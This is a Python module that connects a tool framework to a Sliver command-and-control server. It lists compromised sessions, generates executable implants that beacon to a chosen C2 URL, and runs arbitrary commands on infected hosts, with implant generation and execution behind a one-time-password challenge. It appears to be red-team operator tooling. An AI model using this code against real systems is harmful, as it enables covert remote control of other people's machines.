"""
tools/sliver_bridge.py — Sliver C2 gRPC Bridge.

Requires SLIVER_CONFIG_PATH env var pointing to a Sliver operator .cfg file.
NATO OTP is MANDATORY for all implant generation and session interaction.
Read-only operations (list_sessions) do not require authorization.
"""

import asyncio
import os
from datetime import datetime, timezone
from pathlib import Path

from loguru import logger

SLIVER_CONFIG_PATH = os.getenv("SLIVER_CONFIG_PATH", "")
_sessions: dict[str, dict] = {}


async def _get_client():
    """Return connected Sliver client or None."""
    if not SLIVER_CONFIG_PATH or not Path(SLIVER_CONFIG_PATH).exists():
        return None
    try:
        from sliver import SliverClientConfig, SliverClient
        config = SliverClientConfig.parse_config_file(SLIVER_CONFIG_PATH)
        client = SliverClient(config)
        await client.connect()
        return client
    except Exception as e:
        logger.debug(f"SLIVER_BRIDGE: connect failed: {e}")
        return None


async def list_sessions(client, broadcast_fn) -> list[dict]:
    """List active sessions. No OTP — read-only."""
    try:
        sessions = await client.sessions()
        result = []
        for s in sessions:
            info = {
                "session_id":  str(s.ID),
                "name":        s.Name,
                "remote_addr": s.RemoteAddress,
                "os":          s.OS,
                "arch":        s.Arch,
                "hostname":    s.Hostname,
            }
            _sessions[str(s.ID)] = info
            result.append(info)
        await broadcast_fn({
            "type":      "sliver_sessions",
            "sessions":  result,
            "count":     len(result),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        return result
    except Exception as e:
        await broadcast_fn({"type": "error", "error": f"Sliver sessions: {e}"})
        return []


async def generate_implant(
    client, target_os: str, target_arch: str,
    c2_url: str, broadcast_fn, tool_executor,
) -> None:
    """Generate Sliver implant. NATO OTP MANDATORY."""
    auth_ok, auth_word = await tool_executor._challenge(
        tool_name="sliver_generate",
        preview=f"Implant → {target_os}/{target_arch} → {c2_url}",
    )
    if not auth_ok:
        await broadcast_fn({"type": "error",
            "error": f"[DENIED] Sliver generate blocked: {auth_word}"})
        return

    await broadcast_fn({"type": "sliver_generating",
                        "target_os": target_os, "c2_url": c2_url})
    try:
        implant = await client.generate_implant(
            os=target_os, arch=target_arch,
            c2_urls=[c2_url], format="EXECUTABLE",
        )
        await broadcast_fn({
            "type":       "sliver_implant_ready",
            "filename":   implant.File.Name,
            "size_bytes": len(implant.File.Data),
            "timestamp":  datetime.now(timezone.utc).isoformat(),
        })
    except Exception as e:
        await broadcast_fn({"type": "error", "error": f"Sliver generate: {e}"})


async def interact_session(
    client, session_id: str, command: str,
    broadcast_fn, tool_executor,
) -> None:
    """Execute command on session. NATO OTP MANDATORY."""
    auth_ok, auth_word = await tool_executor._challenge(
        tool_name="sliver_interact",
        preview=f"Session {session_id[:8]} → {command[:80]}",
    )
    if not auth_ok:
        await broadcast_fn({"type": "error",
            "error": f"[DENIED] Sliver interact blocked: {auth_word}"})
        return
    try:
        session = await client.interact_session(session_id)
        result  = await session.execute(command, [])
        await broadcast_fn({
            "type":       "sliver_exec_result",
            "session_id": session_id,
            "command":    command[:80],
            "stdout":     result.Stdout.decode(errors="replace")[:500],
            "stderr":     result.Stderr.decode(errors="replace")[:200],
            "timestamp":  datetime.now(timezone.utc).isoformat(),
        })
    except Exception as e:
        await broadcast_fn({"type": "error", "error": f"Sliver exec: {e}"})


async def start_sliver_monitor(broadcast_fn) -> None:
    """Background session poller. Silent if config not set."""
    if not SLIVER_CONFIG_PATH:
        return
    while True:
        client = await _get_client()
        if client:
            try:
                while True:
                    await list_sessions(client, broadcast_fn)
                    await asyncio.sleep(30)
            except Exception:
                pass
        await asyncio.sleep(60)
